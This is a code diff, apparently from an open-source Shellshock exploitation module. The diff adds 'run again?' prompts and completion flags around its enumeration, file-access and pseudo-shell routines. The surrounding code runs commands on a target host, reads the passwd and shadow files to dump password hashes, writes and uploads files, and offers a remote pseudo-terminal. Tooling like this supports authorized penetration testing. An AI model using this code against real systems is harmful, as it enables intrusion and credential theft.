@@ -61,6 +61,7 @@ Enumeration Options
 """
 def enumeration(url, cve, check_header):
 
+  print ""
   #-------------------------------
   # Hostname enumeration
   #-------------------------------
@@ -71,27 +72,7 @@ def enumeration(url, cve, check_header):
       print ""
     sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
     sys.stdout.flush()
-
-  #-------------------------------
-  # Retrieve system information
-  #-------------------------------
-  if menu.options.sys_info:
-    cmd = settings.RECOGNISE_OS            
-    target_os = cmd_exec(url, cmd, cve, check_header)
-    if target_os == "Linux":
-      cmd = settings.RECOGNISE_HP
-      target_arch = cmd_exec(url, cmd, cve, check_header)
-      if target_arch:
-        if menu.options.verbose:
-          print ""
-        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
-        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
-        sys.stdout.flush()
-    else:
-      if menu.options.verbose:
-        print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
-      sys.stdout.flush()
+    settings.ENUMERATION_DONE = True
 
   #-------------------------------
   # The current user enumeration
@@ -118,6 +99,29 @@ def enumeration(url, cve, check_header):
           print ""
         sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
         sys.stdout.flush()
+    settings.ENUMERATION_DONE = True
+
+  #-------------------------------
+  # Retrieve system information
+  #-------------------------------
+  if menu.options.sys_info:
+    cmd = settings.RECOGNISE_OS            
+    target_os = cmd_exec(url, cmd, cve, check_header)
+    if target_os == "Linux":
+      cmd = settings.RECOGNISE_HP
+      target_arch = cmd_exec(url, cmd, cve, check_header)
+      if target_arch:
+        if menu.options.verbose:
+          print ""
+        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
+        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
+        sys.stdout.flush()
+    else:
+      if menu.options.verbose:
+        print ""
+      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
+      sys.stdout.flush()
+    settings.ENUMERATION_DONE = True
 
   #-------------------------------
   # System users enumeration
@@ -161,7 +165,8 @@ def enumeration(url, cve, check_header):
           print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
       else:
         print "\n" + Fore.YELLOW + "(^) Warning: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
-    
+    settings.ENUMERATION_DONE = True
+
     #-------------------------------------
     # System password enumeration
     #-------------------------------------
@@ -186,7 +191,7 @@ def enumeration(url, cve, check_header):
               print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
         else:
           print "\n" + Fore.YELLOW + "(^) Warning: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
-          
+      settings.ENUMERATION_DONE = True  
 
 """
 File Access Options
@@ -210,6 +215,7 @@ def file_access(url, cve, check_header):
     else:
      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + Style.RESET_ALL)
      sys.stdout.flush()
+    settings.FILE_ACCESS_DONE = True
 
   #-------------------------------------
   # Write to a file on the target host.
@@ -228,6 +234,7 @@ def file_access(url, cve, check_header):
     else:
       sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
       sys.stdout.flush()
+    settings.FILE_ACCESS_DONE = True
 
     #-------------------------------
     # Check the file-destination
@@ -255,6 +262,7 @@ def file_access(url, cve, check_header):
     else:
      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
+    settings.FILE_ACCESS_DONE = True
 
   #-------------------------------------
   # Upload a file on the target host.
@@ -295,7 +303,7 @@ def file_access(url, cve, check_header):
     else:
      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
-
+    settings.FILE_ACCESS_DONE = True
 
 """
 The main shellshock handler
@@ -363,10 +371,45 @@ def shellshock_handler(url, http_request_method, filename):
           print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
           
           # Enumeration options.
-          enumeration(url, cve, check_header)
+          if settings.ENUMERATION_DONE == True :
+            print ""
+            while True:
+              enumerate_again = raw_input("(?) Do you want to enumerate again? [Y/n/q] > ").lower()
+              if enumerate_again in settings.CHOISE_YES:
+                enumeration(url, cve, check_header)
+                print ""
+                break
+              elif enumerate_again in settings.CHOISE_NO: 
+                break
+              elif enumerate_again in settings.CHOISE_QUIT:
+                sys.exit(0)
+              else:
+                if enumerate_again == "":
+                  enumerate_again = "enter"
+                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
+                pass
+          else:
+            enumeration(url, cve, check_header)
 
           # File access options.
-          file_access(url, cve, check_header)
+          if settings.FILE_ACCESS_DONE == True :
+            while True:
+              file_access_again = raw_input("(?) Do you want to access files again? [Y/n/q] > ").lower()
+              if file_access_again in settings.CHOISE_YES:
+                file_access(url, cve, check_header)
+                break
+              elif file_access_again in settings.CHOISE_NO: 
+                break
+              elif file_access_again in settings.CHOISE_QUIT:
+                sys.exit(0)
+              else:
+                if file_access_again == "":
+                  file_access_again  = "enter"
+                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
+                pass
+          else:
+            file_access(url, cve, check_header)
+            print ""
 
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
@@ -380,7 +423,9 @@ def shellshock_handler(url, http_request_method, filename):
             while True:
               if go_back == True:
                 break
-              gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+              # if settings.ENUMERATION_DONE == False or settings.FILE_ACCESS_DONE == False :
+              #   print ""
+              gotshell = raw_input("(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
               if gotshell in settings.CHOISE_YES:
                 print ""
                 print "Pseudo-Terminal (type '?' for shell options)"
@@ -423,6 +468,9 @@ def shellshock_handler(url, http_request_method, filename):
                     return False 
                   else:
                     return True 
+
+              elif gotshell in settings.CHOISE_QUIT:
+                sys.exit(0)
 
               else:
                 if gotshell == "":
